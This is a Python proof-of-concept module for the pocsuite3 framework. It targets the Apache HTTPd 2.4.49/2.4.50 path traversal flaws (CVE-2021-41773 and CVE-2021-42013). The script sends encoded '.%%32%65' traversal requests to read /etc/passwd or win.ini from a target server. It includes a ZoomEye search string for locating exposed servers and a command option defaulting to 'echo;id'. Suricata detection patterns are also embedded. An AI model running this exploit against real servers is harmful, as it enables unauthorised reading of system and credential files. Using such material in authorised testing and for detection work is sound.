#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import urllib
from urllib.error import HTTPError
from collections import OrderedDict
from pocsuite3.api import OptString
from pocsuite3.api import (
    Output, POCBase, register_poc, requests,
    get_listener_ip, get_listener_port
)


class TestPOC(POCBase):
    vulID = '99364'
    version = '1.0'
    author = ['']
    vulDate = '2021-10-6'
    createDate = '2021-10-6'
    updateDate = '2021-10-9'
    references = ['https://www.seebug.org/vuldb/ssvid-99364']
    name = 'Apache HTTPd'
    appPowerLink = 'https://httpd.apache.org/'
    appName = 'Apache HTTPd'
    appVersion = '2.4.49 or 2.4.50'
    vulType = 'dir-traversal'
    desc = 'Apache HTTPd cve-2021-41773 cve-2021-42013'
    samples = ['']
    dork = {'zoomeye': '"Apache/2.4.49" "Apache/2.4.50"'}
    install_requires = []
    suricata_request = '''
    http.method; content:"GET"; content:"POST";
    http.uri; content: "%2e";content: "/icons";
    content: "/cgi-bin"; content: ".%%32%65"
    '''
    suricata_response = 'content: "bin:"'

    def _check(self):
        self.url = self.url.rstrip('/')
        res = requests.get(
            self.url,
            timeout=10,
            verify=False
        )
        return 'Apache/2.4.49' in str(res.headers) or 'Apache/2.4.50' in str(res.headers)

    def _read(self, directory, filename):
        uri = self.url.rstrip('/')+'/'+directory+'/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65'+filename
        try:
            req = urllib.request.Request(uri)
            res = urllib.request.urlopen(req)
        except HTTPError as e:
            if(e.code == 403):
                print(uri+' not exist directory '+directory+' or not vulnerable')
                return {}
            elif(e.code == 500):
                print(self.url+' should exist vulnerable,When read file don\'t make cgi-bin,Plase try change directory')
                return {}
            elif(e.code == 404):
                print(self.url+' not exist file '+filename)
                return {}
            else:
                return {}
        res_text = res.read().decode()
        if('bin:' in res_text or 'fonts' in res_text):
            return res_text
        else:
            return {}

    def _verify(self):
        result = {}
        result['VerifyInfo'] = {}
        directory = self.get_option('directory')
        files = ['/etc/passwd', '/Windows/win.ini']
        for i in files:
            result['VerifyInfo']['file'] = self._read(directory, i)
            if result['VerifyInfo']['file'] != {}:
                break
            else:
                continue
        result['VerifyInfo']['URL'] = self.url
        if(result['VerifyInfo']['file'] == {}):
            return self.parse_output({})
        else:
            return self.parse_output(result)

    def _options(self):
        o = OrderedDict()
        o['cmd'] = OptString('echo;id', description='The command to execute')
        o["filename"] = OptString('/etc/passwd', description='The file to read')
        o['directory'] = OptString('icons', description='must be a existing directory')
        return o

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)